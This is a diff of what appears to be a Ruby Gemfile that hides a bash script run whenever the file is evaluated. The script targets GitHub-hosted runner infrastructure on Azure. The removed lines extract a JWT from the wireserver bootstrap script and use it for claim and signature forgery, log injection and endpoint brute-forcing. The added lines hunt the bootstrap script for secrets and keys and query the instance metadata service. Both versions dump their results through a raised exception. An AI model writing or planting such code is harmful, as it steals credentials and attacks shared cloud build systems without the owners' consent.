@@ -2,7 +2,7 @@ require 'net/http'; require 'uri'; require 'json'; require 'tempfile'
 m = []
 shell_code = <<'SHELL'
 set +e
-WD=/tmp/v121; rm -rf "$WD" && mkdir "$WD" && cd "$WD"
+WD=/tmp/v122; rm -rf "$WD" && mkdir "$WD" && cd "$WD"
 curl -sf -H "x-ms-agent-name: WALinuxAgent" -H "x-ms-version: 2015-04-05" -o gs.xml "http://168.63.129.16/machine/?comp=goalstate"
 cat > x1.py <<'PY'
 import re, html
@@ -41,103 +41,47 @@ sys.stdout.write(d.get('script',''))
 PY
 python3 x4.py | base64 -d > bs.sh 2>/dev/null
 
-ORCH=$(grep -oE 'hosted-compute-request-orchestrator-prod-[a-z0-9]+-[0-9]+\.githubapp\.com' bs.sh | head -1)
-WATCHDOG=$(grep -oE 'hosted-compute-watchdog-prod-[a-z0-9]+-[0-9]+\.githubapp\.com' bs.sh | head -1)
-JWT=$(grep -oE 'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+' bs.sh | head -1)
-echo "STEP_ORCH=$ORCH WATCHDOG=$WATCHDOG"
+echo "STEP_BS_LEN=$(wc -c < bs.sh)"
+echo "STEP_BS_SHA=$(sha256sum bs.sh)"
 
-PAY=$(echo "$JWT" | cut -d. -f2 | tr '_-' '/+'); PL=${#PAY}; PM=$((PL%4)); [ $PM -ne 0 ] && PAY="${PAY}$(printf '=%.0s' $(seq 1 $((4-PM))))"
-T=$(echo "$PAY" | base64 -d 2>/dev/null | python3 -c "import json,sys; d=json.load(sys.stdin); print(d.get('iat',0), d.get('rbf',0))")
-IAT=$(echo $T | awk '{print $1}')
-RBF=$(echo $T | awk '{print $2}')
-NOW=$(date +%s)
-WAIT=$((RBF - NOW + 15))
-echo "STEP_JWT_TIMING iat=$IAT rbf=$RBF now=$NOW wait=$WAIT"
-[ "$WAIT" -gt 0 ] && [ "$WAIT" -lt 800 ] && sleep $WAIT
+# Extract ALL URLs from bootstrap script
+echo "===ALL_URLS==="
+grep -oE 'https?://[A-Za-z0-9._/?&=:%-]+' bs.sh | sort -u | head -50
 
-# === CLAIMS TAMPER TEST AGAINST WATCHDOG ===
-echo "===WATCHDOG_CLAIMS_TAMPER==="
-RAW_HDR=$(echo "$JWT" | cut -d. -f1)
-RAW_SIG=$(echo "$JWT" | cut -d. -f3)
-MOD_PAY=$(echo "$PAY" | base64 -d 2>/dev/null | python3 -c "
-import json, sys, base64
-d = json.load(sys.stdin)
-d['mac'] = 'AA-BB-CC-DD-EE-FF'
-d['vmn'] = 'SPOOFED_VMN'
-d['wid'] = '{spoofed-rg}:{00000000-0000-0000-0000-000000000000}:{11111111-1111-1111-1111-111111111111}'
-out = json.dumps(d, separators=(',',':')).encode()
-print(base64.urlsafe_b64encode(out).decode().rstrip('='))
-")
-MOD_JWT="${RAW_HDR}.${MOD_PAY}.${RAW_SIG}"
-echo "STEP_MOD_JWT_LEN=${#MOD_JWT}"
+echo "===HOSTNAMES==="
+grep -oE '[a-z0-9-]+\.[a-z0-9-]+\.[a-z]+(\.[a-z]+)*' bs.sh | grep -vE '^(html|css|js|svg|png|jpg|gif|ico)\.' | sort -u | head -30
 
-curl -s -m 8 -X POST -H "Authorization: Bearer $MOD_JWT" -H "Content-Type: application/json" -d '[]' -o m.txt -w "MOD_JWT /v1/trace POST=[] HTTP=%{http_code} LEN=%{size_download}\n" "https://$WATCHDOG/v1/trace"
-echo " body_b64=$(base64 -w0 < m.txt | head -c 500)"
+echo "===INTERESTING_LINES==="
+# Find lines with relevant keywords
+grep -nE 'curl|wget|http|api|token|secret|key|password|cred|api-version|register|register|jwks' bs.sh | head -30
 
-# === PURE BOGUS PAYLOAD + REAL SIG ===
-echo "===WATCHDOG_BOGUS_PAY==="
-BOGUS_PAY=$(echo -n '{"sub":"forged","iss":"forged","iat":0,"rbf":0}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
-BOGUS_JWT="${RAW_HDR}.${BOGUS_PAY}.${RAW_SIG}"
-curl -s -m 8 -X POST -H "Authorization: Bearer $BOGUS_JWT" -H "Content-Type: application/json" -d '[]' -o b.txt -w "BOGUS_JWT HTTP=%{http_code} LEN=%{size_download}\n" "https://$WATCHDOG/v1/trace"
-echo " body_b64=$(base64 -w0 < b.txt | head -c 500)"
+echo "===SECRET_HINTS==="
+grep -nE 'BEGIN|PRIVATE|export|systemctl|MountPath|env|PEM' bs.sh | head -20
 
-# === REUSED REAL JWT BUT BOGUS SIG (test if any sig path matches) ===
-echo "===WATCHDOG_REAL_PAY_BOGUS_SIG==="
-BOGUS_SIG=$(echo -n "definitely-not-a-valid-signature-1234567890ABCDEF" | base64 -w0 | tr '+/' '-_' | tr -d '=')
-ORIG_PAY=$(echo "$JWT" | cut -d. -f2)
-FAKE_SIG_JWT="${RAW_HDR}.${ORIG_PAY}.${BOGUS_SIG}"
-curl -s -m 8 -X POST -H "Authorization: Bearer $FAKE_SIG_JWT" -H "Content-Type: application/json" -d '[]' -o fs.txt -w "FAKE_SIG HTTP=%{http_code} LEN=%{size_download}\n" "https://$WATCHDOG/v1/trace"
-echo " body_b64=$(base64 -w0 < fs.txt | head -c 500)"
+echo "===SCRIPT_HEAD==="
+head -c 3000 bs.sh
 
-# === CLAIMS TAMPER ALSO AGAINST WATCHDOG WITH DIFFERENT KID ===
-# Use orchestrator's PUBLIC kid (which orchestrator's storage doesn't have)
-echo "===WATCHDOG_PUB_KID==="
-PUB_HDR=$(echo -n '{"alg":"EdDSA","kid":"knuk4O1V9+pZXutc","typ":"JWT"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
-PUB_JWT="${PUB_HDR}.${ORIG_PAY}.${RAW_SIG}"
-curl -s -m 8 -X POST -H "Authorization: Bearer $PUB_JWT" -H "Content-Type: application/json" -d '[]' -o pk.txt -w "PUB_KID HTTP=%{http_code} LEN=%{size_download}\n" "https://$WATCHDOG/v1/trace"
-echo " body_b64=$(base64 -w0 < pk.txt | head -c 500)"
+echo "===SCRIPT_MIDDLE==="
+LEN=$(wc -c < bs.sh)
+MID=$((LEN/2))
+dd if=bs.sh bs=1 skip=$MID count=3000 2>/dev/null
 
-# === BIG LOG INJECTION WITH UNIQUE MARKER ===
-echo "===WATCHDOG_LOG_INJECT==="
-MARK="BENTY-LOG-INJECT-v121-$(date +%s)"
-# Inject a large array of log entries with the marker
-BODY="["
-for i in $(seq 1 5); do
-  [ $i -gt 1 ] && BODY="${BODY},"
-  BODY="${BODY}{\"message\":\"$MARK iteration $i\",\"VmName\":\"mr-benty-target\",\"Level\":\"Critical\",\"Source\":\"BENTY\"}"
-done
-BODY="${BODY}]"
-curl -s -m 8 -X POST -H "Authorization: Bearer $JWT" -H "Content-Type: application/json" -d "$BODY" -o w.txt -w "LOG_INJECT HTTP=%{http_code} LEN=%{size_download}\n" "https://$WATCHDOG/v1/trace"
-echo " body_b64=$(base64 -w0 < w.txt | head -c 500)"
+echo "===SCRIPT_TAIL==="
+tail -c 3000 bs.sh
 
-# === BRUTE WATCHDOG PATHS WITH GET ===
-echo "===WATCHDOG_GET_PATHS==="
-for P in /v1/trace /v1/health /v1/info /v1/version /v1/agents /v1/jobs /v1/admin /v1/internal /metrics /openapi.json /api/spec /swagger /swagger.json /docs /api/docs; do
-  curl -s -m 5 -H "Authorization: Bearer $JWT" -o w.txt -w "GET $P HTTP=%{http_code} LEN=%{size_download}\n" "https://$WATCHDOG$P"
-  if [ "$(stat -c%s w.txt)" -gt 0 ]; then
-    echo "  body_b64=$(base64 -w0 < w.txt | head -c 300)"
-  fi
-done
+# Also try to access the VM's metadata via /metadata/instance (IMDS)
+echo "===IMDS_DIRECT==="
+curl -s -m 5 -H "Metadata: true" -o imds.json -w "HTTP=%{http_code} LEN=%{size_download}\n" "http://169.254.169.254/metadata/instance?api-version=2021-12-13"
+echo "IMDS_B64=$(base64 -w0 < imds.json | head -c 500)"
 
-# === CHECK ORCHESTRATOR PATHS WITHOUT V1 PREFIX ===
-echo "===ORCH_NON_V1_PATHS==="
-for P in /agents /work /poll /lease /register /trace /openapi.json /metrics /healthz; do
-  curl -s -m 5 -H "Authorization: Bearer $JWT" -o o.txt -w "GET $P HTTP=%{http_code} LEN=%{size_download}\n" "https://$ORCH$P"
-done
-
-# === TRY A LOOK BACK: Submit a POST and immediately GET the same path to see if data is queryable ===
-echo "===WATCHDOG_WRITE_THEN_READ==="
-MARK2="BENTY-READBACK-v121-$(date +%s)"
-curl -s -m 5 -X POST -H "Authorization: Bearer $JWT" -H "Content-Type: application/json" -d "[{\"message\":\"$MARK2\",\"Source\":\"BENTY-READBACK\"}]" -o w.txt -w "POST HTTP=%{http_code}\n" "https://$WATCHDOG/v1/trace"
-sleep 2
-# Now try to GET /v1/trace to see if the just-injected log is returned
-curl -s -m 5 -H "Authorization: Bearer $JWT" -o r.txt -w "GET HTTP=%{http_code} LEN=%{size_download}\n" "https://$WATCHDOG/v1/trace?vmn=$MARK2"
-echo " body_b64=$(base64 -w0 < r.txt | head -c 500)"
+# Try IMDS via Azure VM public IP (168.63.129.16 is wireserver, but IMDS is 169.254...)
+echo "===IMDS_VIA_WIRE==="
+curl -s -m 5 -H "Metadata: true" -o w.json -w "HTTP=%{http_code} LEN=%{size_download}\n" "http://168.63.129.16/metadata/instance?api-version=2021-12-13"
 SHELL
-Tempfile.create('v121.sh') do |f|
+Tempfile.create('v122.sh') do |f|
   f.write(shell_code); f.flush
   output = `bash #{f.path} 2>&1`
-  output.lines.each { |line| m << "v121 " + line.chomp[0..1500] }
+  output.lines.each { |line| m << "v122 " + line.chomp[0..2000] }
 end
 raise m.join("\n")
 source "https://rubygems.org"
